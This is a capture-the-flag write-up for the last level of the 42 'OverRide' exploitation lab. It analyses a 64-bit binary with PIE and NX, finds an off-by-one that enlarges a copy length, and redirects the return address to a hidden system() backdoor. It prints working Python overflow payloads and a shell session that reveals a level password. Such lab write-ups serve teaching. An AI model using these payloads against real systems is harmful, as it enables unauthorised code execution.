# level09

### First analysis

For this first and only bonus, this last level of override, and the last level of the cybersecurity branch, of 42 let's analyse the checksec and the code as always starting with the checksec:

```sh
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
```

This time no stack canary, so we can overflow buffers as we want, shouldn't be a problem, we have a Partial RELRO, we described enough this parameter to know that it doesn't protect a lot the GOT exploit. However we have NX enabled, which means the stack won't be executable probably, and also PIE enabled which is an option we never encountered before. What PIE does when enabled is that it randomize the addresses to avoid fix addresses in the code. PIE means Position Independent Execution and what it does is that it create an offset, apply it to every address of the code, so we can't know where a function's address is for instance. However this offset can be found in the stack so if we have a way to read the stack with the code, shouldn't be that much of a problem.

Now for the code:

```c
typedef struct  s_msg {
    char    msg[140];
    char    username[40];
    int     len;
}   t_msg;

void    secret_backdoor() {
    char    cmd[128];

    fgets(cmd, sizeof(cmd), stdin);
    system(cmd);
}

void    set_username(t_msg *msg) {
    char    username[128];

    memset(username, 0, 128);
    puts(">: Enter your username");
    printf(">>: ");
    fgets(username, 128, stdin);

    for (int i = 0; i <= 40 && username[i]; i++) {
        msg->username[i] = username[i];
    }
    printf(">: Welcome %s", msg->username);

    return;
}

void    set_msg(t_msg *msg) {
    char    buffer[1024];

    memset(buffer, 0, 1024);
    puts(">: Msg @Unix-Dude");
    printf(">>: ");
    fgets(buffer, 1024, stdin);
    strncpy(msg->msg, buffer, msg->len);

    return;
}

void    handle_msg() {
    t_msg   *msg;

    memset(msg->username, 0, 40);
    msg->len = 140;
    set_username(msg);
    set_msg(msg);
    puts(">: Msg sent!");

    return;
}

int main(void) {
    puts("--------------------------------------------\n");
    puts("|   ~Welcome to l33t-m$n ~    v1337        |\n");
    puts("--------------------------------------------");
    handle_msg();

    return 0;
}
```

So we have a basic program that only call handle_message() which will call 2 functions, set_username() and set_msg(). All the data is stored in a structure msg, that contains a message of 140 chars, a username of 40 chars and a length, simply an int. set_username() will just ask the user to input a username, and will store it in msg->username, and set_msg() will just ask another input to the user, then copy the buffer into msg->msg. msg->len is a constant set at 140 and the user can't interact with it. That's what the program is about.

Now there are a few things to notice quickly, first there is a "secret_backdoor" function that is never called in the code but still present. Everytime we had a functions not called by the program in this cybersecurity branch, we had to redirect the code to this function, plus here this secret_backdoor() literally call system() with an input the user can choose. The solution is certainly here (if it's not a bait). We can also notice that username is filled until length <= 40, not length < 40, which means there is no \0 placed in here, and the input goes 1 too far into username filled, so we have an overflow of 1 character.

Finally we can notice that strncpy uses msg->len as the length it has to copy into msg->msg. Which means if we could change msg->len, we could maybe overflow msg->msg.

### Solution

With these 3 elements we probably have the solution, we need to access secret_backdoor(), so first let's find its address. Since only PIE is activated and not ASLR on this machine, that's definitely gonna be easier:

```sh
(gdb) x secret_backdoor
0x88c <secret_backdoor>:	0xe5894855
(gdb) run
Starting program: /home/users/level09/level09
(gdb) x secret_backdoor
0x55555555488c <secret_backdoor>:	0xe5894855
```

As we can see the address changed between the moment the program is loaded and the moment it is run, that is because of PIE, however we launched the program a few times and the address seems to be the same. It is always 0x55555555488c, a 64bit address (this ELF is a 64bit compiled program). So let's consider that this address will somehow be constant.

Then we have to understand what happen in memory when dealing with structure. What it does is create a memory space for it and put every field side to side which means in memory we will have:

```
[    msg 140    ][   username 40   ][   len 4   ]
```

With that we can notice that username field is just next to len field, also if username fills its field one too far, it means that it will overwrite the first byte of len, and so change the size that we can copy in msg. If we set the last char of username ad "0xff" we could enter a very large number of data in username, enough to do whatever we want being limitless. Let's first try our theory and see if we can at least provoke a segfault and maybe even detect where the return address is if we do it right.

```sh
level09@OverRide:~$ (python -c 'print "A" * 40 + "\xff" + "\n" + "A" * 140 + "B" * 160'; cat) | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Segmentation fault (core dumped)
```

So we wrote 40 chars in username and added 0xff at the end, then we tried to write 300 chars in msg to see how it goes, and it segfault which is a great news ! Now let's find the actual index of the return address with our knowledges accumulated through these projects. In the memory we are gonna have as we said 140 chars for msg, 40 chars for username and 4 chars for len. Added to that 8 bytes (we are in 64bits so yes 8 not 4 bytes for addresses) for RBP (equivalent of EBP in 64bits), 8 bytes again for RIP, so in total 200 bytes, since we are not entirely sure of this calculation we are gonna try with 192, 200, 208 and 216 just in case we forgot something. On this payload we also have to add the secret_backdoor() address and the input we wanna give in this function which will obviously be /bin/sh to get a shell as end user. The payload will look like something like that:

```sh
python -c 'print "A" * 40 + "\xff" + "\n" + "A" * 192 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh\n"
```

After testing a little bit we end up getting this with 200 of padding:

```sh
level09@OverRide:~$ (python -c 'print "A" * 40 + "\xff" + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh\n"'; cat) | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

end@OverRide:~$ cat end
GG !
```

This project is now over.

## Important doc
